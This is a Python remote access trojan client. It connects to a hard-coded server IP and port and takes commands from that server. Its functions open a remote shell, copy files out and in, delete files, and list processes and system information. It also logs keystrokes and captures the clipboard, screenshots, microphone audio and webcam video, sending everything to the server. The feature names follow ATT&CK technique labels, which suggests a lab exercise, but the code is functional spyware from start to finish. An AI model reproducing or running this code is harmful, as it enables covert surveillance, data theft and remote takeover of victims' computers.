#!/usr/bin/python
import socket
import sys
import os
import cv2
import sounddevice as sd
import sounddevice as sd
from scipy.io.wavfile import write
from datetime import datetime
import time
import subprocess
import pyautogui
import pyperclip
import platform
from pynput import keyboard

IP='192.168.141.143' # server IP
PORT=12345

operationSystem = platform.system()

def input_capture():
    keys, filename = [], 'log.txt'
    my_file = open(filename, "w+")
    def on_press(key):
        if len(keys) == 40 or key == keyboard.Key.esc:
            temp = "".join(keys)
            my_file.write(temp)
            client.send(str("Logging compleated!").encode("utf-8"))
            my_file.close()
            return False
        else:
            try:
                keys.append(key.char)
            except:
                keys.append("{" + str(key) + "}")
    log = keyboard.Listener(on_press=on_press)
    log.start()
    log.join()

    data = open('log.txt', 'rb')
    for i in data:
        client.sendall(i)
    client.send(b'done')
    data.close()
    os.remove('log.txt')


def file_dir():
    path = client.recv(2048).decode()
    if operationSystem == 'Windows':
        out = subprocess.getoutput('tree /f /a '+path).encode("utf-8")
    else:
        command = 'ls -l '
        out = subprocess.getoutput('ls -l '+path).encode("utf-8")
    client.send(out)

def CLI():
    while True:
        command = client.recv(8192).decode()
        if command=='q':
            break
        cli = subprocess.getoutput(command).encode()
        client.send(cli)


def proc():
    if operationSystem == 'Windows':
        command = 'tasklist'
    else:
        command = 'ps'
    processes = subprocess.getoutput(command)
    temp = open('file.txt', 'w')
    temp.write(processes)
    temp.close()
    data = open('file.txt', 'rb')
    for i in data:
        client.sendall(i)
    client.send(b'done')
    data.close()
    os.remove('file.txt')

def sys_info():
    if operationSystem == 'Windows':
        command = 'systemInfo'
    else:
        command = 'uname -a && lscpu'
    info = subprocess.getoutput(command)
    temp = open('file.txt', 'w', encoding="utf-8")
    temp.write(info)
    temp.close()
    data = open('file.txt', 'rb')
    for i in data:
        client.sendall(i)
    client.send(b'done')
    data.close()
    os.remove('file.txt')


def copy_file():

    choice = client.recv(1024).decode()

    out_file = client.recv(1024).decode()
    in_file = client.recv(1024).decode()
    print("out_file: ", out_file)
    print("in_file: ", in_file)
    print("choice ", choice)

    # copy from client to server
    if choice == '1':
        if os.path.isfile(out_file)==False:
            client.send(b'error')
        else:
            client.send(b'ok')
            data = open(out_file, 'rb')
            for i in data:
                client.sendall(i)
            client.send(b'done')
            data.close()

    # copy from server to client
    elif choice == '2':
        file = open(in_file, 'wb')   
        while True:
            info = client.recv(4096)
            if b'done' in info or not info:
                break
            else:
                file.write(info)
        file.close()


def del_file(filename):
    if os.path.exists(filename):
        if operationSystem == 'Windows':
            subprocess.getoutput('del '+filename).encode("utf-8")
        else:
            subprocess.getoutput('rm '+filename).encode("utf-8")
        if os.path.exists(filename):
            client.send("An error happend".encode("utf-8"))
        else:
            client.send("The file was successfully removed".encode("utf-8"))
    else:
        client.send("The file does not exist".encode("utf-8"))


def clipboard_data():
    buffer = pyperclip.paste()
    client.send(str(buffer).encode("utf-8"))

def screen_capture():
    screen = pyautogui.screenshot()
    screen.save("screen.jpg")
    file = open('screen.jpg', 'rb')
    for i in file:
        client.sendall(i)
    client.send(b'done')
    file.close()
    os.remove('screen.jpg')

def audio_capture(duration):
    fs = 44100
    myrecording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()
    write('audio.wav', fs, myrecording)
    file = open('audio.wav', 'rb')
    for i in file:
        client.sendall(i)
    client.send(b'done')
    file.close()
    os.remove('audio.wav')

def video_capture(duration):
    cap = cv2.VideoCapture(0)
    cap.set(3,640) #
    cap.set(4,480) #
    filename = 'video.mp4'
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
    print(duration)
    i = 0
    while True:
        ret, frame = cap.read()
        out.write(frame)
        time.sleep(0.02)
        i += 1
        if i > (duration*20):
            break
    cap.release()
    out.release()
    cv2.destroyAllWindows()
    file = open('video.mp4', 'rb')
    for i in file:
        client.sendall(i)
    client.send(b'done')
    file.close()

    os.remove('video.mp4')


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
client.connect((IP, PORT)) # підключимося до сервера



data = client.recv(1024)
print(data.decode("utf-8"))

while True:

    command = client.recv(1024).decode()
    if command == "sys info": 
            print("System Information Discovery")
            sys_info()
    elif command == "cli":
            print("Command-Line Interface")
            CLI()
    elif command == "dir":
            print("File and Directory Discovery")
            file_dir()
    elif command == "copy":
            print("Remote File Copy")
            copy_file()
    elif command == "del":
            print("File Deletion")
            file = client.recv(1024).decode()
            del_file(file)
    elif command == "ps":
            print("Process Discovery")
            proc()
    elif command == "log":
            print("Input Capture")
            input_capture()
    elif command == "buffer":
            print("Clipboard Data")
            clipboard_data()
    elif command == "screen":
            print("Screen Capture")
            screen_capture()
    elif command == "audio":
            print("Audio Capture")
            duration = int(client.recv(1024).decode())
            audio_capture(duration)
    elif command == "webcam":
            print("Video Capture")
            duration = int(client.recv(1024).decode())
            video_capture(duration)
    elif command == "exit":
            break

print("Close connection...")
client.close()